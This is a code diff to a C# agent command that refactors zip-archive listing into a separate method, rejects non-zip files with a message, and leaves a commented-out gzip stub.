@@ -35,9 +35,63 @@ namespace Agent
                 return;
             }
 
+            if(args.path.EndsWith("zip", StringComparison.InvariantCultureIgnoreCase))
+            {
+                extractZip(args.path, job.task.id);
+            }
+            else
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    completed = true,
+                    user_output = $"Only zip supported right now.",
+                    task_id = job.task.id,
+                });
+            }
+            //else if(args.path.EndsWith("gz", StringComparison.InvariantCultureIgnoreCase))
+            //{
+            //    //extractGzip(args.path, job.task.id);
+            //}
+
+        }
+        //void extractGzip(string path, string task_id)
+        //{
+        //    StringBuilder output = new StringBuilder();
+        //    try
+        //    {
+        //        using (ZipArchive archive = ZipFile.OpenRead(path))
+        //        {
+        //            foreach (ZipArchiveEntry entry in archive.Entries)
+        //            {
+        //                output.AppendLine($"{entry.Length}\t {entry.FullName}");
+        //            }
+        //        }
+        //    }
+        //    catch (Exception e)
+        //    {
+        //        messageManager.AddTaskResponse(new TaskResponse
+        //        {
+        //            completed = true,
+        //            user_output = e.ToString(),
+        //            task_id = task_id,
+        //            status = "error"
+        //        });
+        //        return;
+        //    }
+
+        //    messageManager.AddTaskResponse(new TaskResponse
+        //    {
+        //        completed = true,
+        //        user_output = FormatFileData(output.ToString()),
+        //        task_id = task_id,
+        //    });
+        //}
+        void extractZip(string path, string task_id)
+        {
+            StringBuilder output = new StringBuilder();
             try
             {
-                using (ZipArchive archive = ZipFile.OpenRead(args.path))
+                using (ZipArchive archive = ZipFile.OpenRead(path))
                 {
                     foreach (ZipArchiveEntry entry in archive.Entries)
                     {
@@ -51,7 +105,7 @@ namespace Agent
                 {
                     completed = true,
                     user_output = e.ToString(),
-                    task_id = job.task.id,
+                    task_id = task_id,
                     status = "error"
                 });
                 return;
@@ -61,9 +115,8 @@ namespace Agent
             {
                 completed = true,
                 user_output = FormatFileData(output.ToString()),
-                task_id = job.task.id,
+                task_id = task_id,
             });
-
         }
         private string FormatFileData(string data)
         {
